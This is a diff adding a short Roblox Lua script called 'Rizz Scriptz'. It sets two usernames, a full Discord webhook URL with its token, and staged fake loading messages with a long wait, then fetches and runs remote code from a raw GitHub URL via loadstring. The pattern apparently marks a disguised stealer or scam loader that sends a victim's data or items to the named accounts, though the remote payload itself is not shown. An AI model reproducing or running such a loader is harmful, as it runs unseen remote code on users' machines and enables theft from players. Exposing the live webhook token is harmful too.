@@ -1,0 +1,9 @@
+UserName = "axxicinn"
+UserName2 = "emptygod0"
+Webhook = "https://discord.com/api/webhooks/1104352857513271368/rzNpg-c1Ce33vV7kYy8CZQCmDYFWSQY9phSdGXgymtbFjL1mvLef1rjn-bADZWkDOpbl"
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing…"
+_G.SecondText = "Script Loading"
+_G.ThirdText = "Almost Done…"
+_G.WaitingTime = 80
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
